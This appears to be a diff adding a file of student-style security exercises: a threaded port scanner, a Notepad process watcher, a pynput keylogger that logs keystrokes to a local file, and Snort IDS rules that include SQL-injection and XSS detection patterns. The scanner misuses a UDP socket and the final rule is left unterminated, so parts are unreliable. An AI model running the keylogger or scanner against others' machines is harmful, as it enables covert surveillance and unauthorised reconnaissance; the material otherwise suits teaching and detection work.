@@ -1,0 +1,68 @@
+import socket, threading, time
+print_lock = threading.Lock()
+host = input("Domain Name: ")
+ip = socket.gethostbyname(host)
+print("-" * 60)
+print(f"Scanning Start Target IP")
+print("-" * 60)
+def port_scanner(port):
+    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    soc.settimeout(1)
+    result = soc.connect_ex((ip, port))
+    if not result:
+        try:
+            serviceName = socket.getservbyport(port)
+            print(f"Open {port} {serviceName} \n")
+        except:
+            print(f"Open {port} unknown \n")
+    soc.close()
+for port in range(1, 1025):
+    th = threading.Thread(target=port_scanner, args=(port, ))
+    th.start()
+-------------------------------
+import psutil, time
+import tkinter as tk
+from tkinter import messagebox
+def notepadOn():
+    for process in psutil.process_iter(['pid', 'name']):
+        if "notepad.exe" in process.info['name'].lower():
+            return True
+    return False
+def alert():
+    while True:
+        if notepadOn():
+            root = tk.Tk()
+            root.withdraw()
+            messagebox.showwarning("Alert ! Notepad Running !!!")
+            root.destroy()
+        time.sleep(10)
+if __name__ == '__main__':
+    alert()
+-------------------------------
+from pynput.keyboard import Listener
+Special_Keys = ['Key.backspace', 'Key.shift', 'Key.tab', 'Key.esc', 'Key.down', 'Key.left', 'Key.page_down', 'Key.page_up', 'Key.menu', 'Key.start', 'Key.end', 'Key.insert']
+def record(key):
+    letter = str(key)
+    letter = letter.replace("'", "")
+    if letter == 'Key.space':
+        letter = " "
+    for word in Special_Keys:
+        if word == letter:
+            letter = ""
+    if letter == 'Key.enter':
+        letter = '\n'
+    with open("Keylogger_Recorded.txt", 'a') as rec:
+        rec.write(letter)
+with Listener(record) as listen:
+    listen.join()
+----------------------------------------
+alert icmp any any -> any any (msg: "Testing ICMP"; sid: 100001)
+alert tcp any any -> any any (msg: "Testing TCP"; sid: 100002)
+alert udp any any -> any any (msg: "Testing UDP"; sid: 100003)
+alert tcp any any -> $HOME_NET 21 (msg: "FTP Connection Attempt"; sid:100004)
+ipvar SASTRA 192.168.10.11
+alert tcp any any -> $SASTRA 22 (msg: "SSH Connection attempted on SASTRA"; sid:100005)
+ipvar GOOGLE 142.250.185.210
+alert tcp any any -> $GOOGLE $HTTP_PORTS (msg: "Test google.com rule"; content:"google.com"; nocase; sid: 100006)
+alert tcp any any -> $HOME_NET 80 (msg: "Possible SQL Injection Attempt"; flow: to_server,established; content:"' OR '1'='1'; nocase; sid:100007)
+alert tcp any any -> any 80 (msg: "Cross-Site Scripting (XSS) Attack"; flow:to_server,established; content:"<script>"; nocase; pcre:"(<script>."</\script>)/iU
